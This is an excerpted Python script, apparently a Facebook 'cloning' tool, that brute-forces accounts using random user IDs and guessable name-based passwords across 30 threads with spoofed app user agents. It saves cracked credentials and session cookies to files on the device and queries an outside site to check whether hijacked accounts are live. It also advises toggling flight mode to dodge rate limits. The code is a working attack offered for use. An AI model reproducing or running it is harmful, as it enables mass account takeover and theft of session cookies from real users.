...
def __SEX__():
	bal = "[FBAN/FB4A;FBAV/36.0.0.2619;FBBV/8821271;[FBAN/FB4A;FBAV/470.0.0.46.109;FBBV/630169011;FBDM/{density=1.0,width=1920,height=1080};FBLC/en_US;FBRV/452416153;FBCR/Robi;FBMF/Windows;FBBD/Windows;FBPN/com.facebook.katana;FBDV/DellXPS13;FBSV/10.0;FBOP/19;FBCA/arm64-v8a:;]"
...
| |   | | '_ \| | | | | |/ / | '_ \ / _` |
| |___| | |_) | |_| | |   <| | | | | (_| |
|_____|_| .__/ \__,_| |_|\_\_|_| |_|\__, |
        |_|                         |___/ 
{W}──────────────────────────────────────────────────
{xd} DEVELOPER {xdxx} LI{G}P{W}U-XD
{xd} TOOLS     {xdxx} FILE{G}|{W}RANDOM{G}|{W}GMAIL{G}|{W}CLONING
{xd} STATUS    {xdxx} PREMIUM
{W}──────────────────────────────────────────────────"""
#--------------------• MENU •--------------------#
def ___swag___():
	cear();print(f"{xd1} START FILE CLONING ");print(f"{xd2} START RANDOM CLONING ");print(f"{xd3} START GMAIL CLONING ");print(f"{xd0} EXIT CLONING ");linex();chude = input(f'{xdx} SELECT {xdxx} ')
...
def passwordx():
	...
	with tred(max_workers=30) as __swag__:
		for yuzong in id2:
			...
			if len(nmf)<6:
				...
				if len(frs)<3:
					...
					pwv.append(frs+'@123')
					pwv.append(frs+'1122')
			if 'M1' in method:__swag__.submit(___M1___,idf,pwv)
			elif 'M2' in method:__swag__.submit(___M2___,idf,pwv)
			else:__swag__.submit(___M1___,idf,pwv)
#--------------------• FILE METHOD M1 •--------------------#
def ___M1___(idf,pwv):
    global loop,oks,cps
    sys.stdout.write(f'\r{W}<|{G}lipu-M1{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{W}<|{R}lipu-CP{W}|>{R} {idf} | {pw} ')
                open('/sdcard/lipu-M1-FILE-CP.txt','a').write(idf+'|'+pw+'\n')
                cps+=1
                break
                ...
                print(f'\r{W}<|{G}SWAG-OK{W}|>{G} {idf} | {pw} ')
                #print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
                open('/sdcard/SWAG-M1-FILE-OK-COKIE.txt','a').write(idf+'|'+pw+'|'+cookies+'\n')
                break
            else:continue
...
def ___M2___(idf,pwv):
    global loop,oks,cps
    sys.stdout.write(f'\r{W}<|{G}lipu-M2{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
    ua = random.choice(ugen)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{W}<|{R}SWAG-CP{W}|>{R} {idf} | {pw} ')
                open('/sdcard/SWAG-M2-FILE-CP.txt','a').write(idf+'|'+pw+'\n')
                cps+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                oks+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r{W}<|{G}lipu-OK{W}|>{G} {idf} | {pw} ')
                #print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
                open('/sdcard/lipu-M2-FILE-OK-COKIE.txt','a').write(idf+'|'+pw+'|'+cookies+'\n')
                break
            else:continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
...
def ___Bangladesh___():
	...
	for bal in range(limit):swag = ''.join(random.choice(string.digits) for _ in range(8));user.append(swag)
...
def ___India___():
	...
	for bal in range(limit):swag = ''.join(random.choice(string.digits) for _ in range(7));user.append(swag)
	with tred(max_workers=30) as __X__:
		clear();tl = str(len(user))
		print(f"{xd} CODE{G}|{W}UID {xdxx} {code}{G}|{W}{tl} ");print(f'{xd} FLIGHT MODE ON{G}|{W}OFF EVERY 3 MINUTES');linex()
		for love in user:
...
def __M1__(ids,pasx):
	global loop,oks,cps
	sys.stdout.write(f'\r{W}<|{G}SWAG-M1{W}|>{W} {loop}{G}|{W}{oks}{G}|{W}{cps} ');sys.stdout.flush()
	...
	for pw in pasx:
		try:
			...
			if "checkpoint" in ewe.cookies.get_dict():
				...
				print(f'\r{W}<|{R}lipu-CP{W}|>{R} {uid} | {pw} ')
				cps+=1
				open('/sdcard/lipu-M1-RANDOM-CP.txt','a').write(uid+'|'+pw+'\n')
				break
				...
				if "LIVE" in response:
					print(f'\r{W}<|{G}lipu-OK{W}|>{G} {uid} | {pw} ')
					#print(f'\r{W}<|{G}COOKIES{W}|>{W} {kuki} ');linex()
					oks+=1
					open('/sdcard/lipu-M1-RANDOM-OK-COKIE.txt','a').write(uid+'|'+pw+'|'+kuki+'\n')
					break
				else:continue
        ...
        try:
                for pas in pasx:
                        ...
                        if 'session_key' in po:
                                ...
                                response = str(requests.get(f"http://www.hearhour.shop/ajaxs/client/check-live-fb.php?uid={uid}").text)
                                if "LIVE" in response:
                                	print(f'\r{W}<|{G}lipu-OK{W}|>{G} {str(uid)} | {pas} ')
                                	#print(f'\r{W}<|{G}COOKIES{W}|>{W} {coki} ');linex()
                                	open('/sdcard/lipu-M2-RANDOM-OK-COKIE.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                	oks.append(str(uid))
                                	break
                                else:continue
                        elif 'www.facebook.com' in po['error']['message']: 
                                uid = po['error']['error_data']['uid']
                                print(f'\r{W}<|{R}lipu-CP{W}|>{R} {str(uid)} | {pas} ')
                                open('/sdcard/lipu-M2-RANDOM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
